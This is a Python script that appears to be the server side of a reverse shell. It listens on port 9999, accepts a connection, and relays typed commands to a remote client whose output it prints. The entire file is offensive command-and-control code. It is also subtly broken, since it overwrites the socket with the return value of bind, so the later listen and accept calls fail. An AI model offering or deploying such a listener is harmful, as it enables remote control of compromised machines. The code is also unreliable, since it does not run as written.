from socket import *
import sys  # to implement command promt or terminal commnads

#create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999 #not used port
        s = socket()
    except error as msg:
        print("socket creation error : " + str(msg))

#Binding sockets and listening

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port "+str(port))
        s = s.bind((host,port))
        s.listen(5)
    except error as msg:
        print("socket Binding error"+str(msg)+"\n"+"Retrying........")
        bind_socket()

#Establishing connections
def accept_connection():
    conn,address = s.accept()
    print("Connection has been established\n")
    print("Host IP"+str(address[0])+" "+"Port"+str(address[1]))
    send_commands(conn)
    conn.close()

#send commands to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
    create_socket()
    bind_socket()
    accept_connection()

main()



